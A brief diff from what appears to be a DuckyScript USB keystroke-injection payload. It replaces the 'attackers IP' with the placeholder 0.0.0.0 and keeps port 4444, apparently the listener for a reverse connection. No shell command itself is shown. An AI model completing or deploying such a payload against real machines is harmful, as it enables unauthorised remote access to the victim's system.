@@ -38,7 +38,7 @@ EXTENSION DETECT_READY
 END_EXTENSION
 
 REM Define the attackers IP & Port
-DEFINE ADDRESS '192.168.4.14'
+DEFINE ADDRESS '0.0.0.0'
 DEFINE PORT 4444
 
 REM Variables for pseudo random variables
